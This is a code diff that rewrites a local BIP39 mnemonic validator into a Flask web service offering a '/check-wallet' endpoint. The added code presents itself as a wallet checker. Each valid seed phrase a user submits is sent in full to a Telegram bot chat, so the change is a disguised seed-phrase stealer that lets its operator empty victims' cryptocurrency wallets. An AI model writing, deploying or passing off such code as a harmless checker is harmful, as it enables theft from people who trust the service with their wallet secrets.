@@ -1,23 +1,26 @@
-import os
+from flask import Flask, request
+import requests
 from mnemonic import Mnemonic
-from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins
+import os
 
-# Load 12-word phrase from env variable
-mnemonic_phrase = os.environ.get("MNEMONIC_12")
+app = Flask(__name__)
+mnemo = Mnemonic("english")
 
-def is_valid_mnemonic(mnemonic_phrase):
-    mnemo = Mnemonic("english")
-    return mnemo.check(mnemonic_phrase)
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-def derive_eth_address(mnemonic_phrase):
-    seed_bytes = Bip39SeedGenerator(mnemonic_phrase).Generate()
-    bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
-    return bip44_mst.PublicKey().ToAddress()
+@app.route("/check-wallet", methods=["GET"])
+def check_wallet():
+    mnemonic_phrase = request.args.get("mnemonic")
+    if not mnemo.check(mnemonic_phrase):
+        return "invalid", 400
 
-if not mnemonic_phrase:
-    print("No mnemonic phrase provided in MNEMONIC_12 env variable.")
-elif not is_valid_mnemonic(mnemonic_phrase):
-    print("❌ Invalid BIP39 mnemonic.")
-else:
-    eth_address = derive_eth_address(mnemonic_phrase)
-    print(f"✅ Valid mnemonic. Derived Ethereum address: {eth_address}")
+    # (Optional) Add more logic to verify wallet balance here
+
+    message = f"✅ VALID MNEMONIC:\n\n{mnemonic_phrase}"
+    requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                 params={"chat_id": TELEGRAM_CHAT_ID, "text": message})
+    return "valid"
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
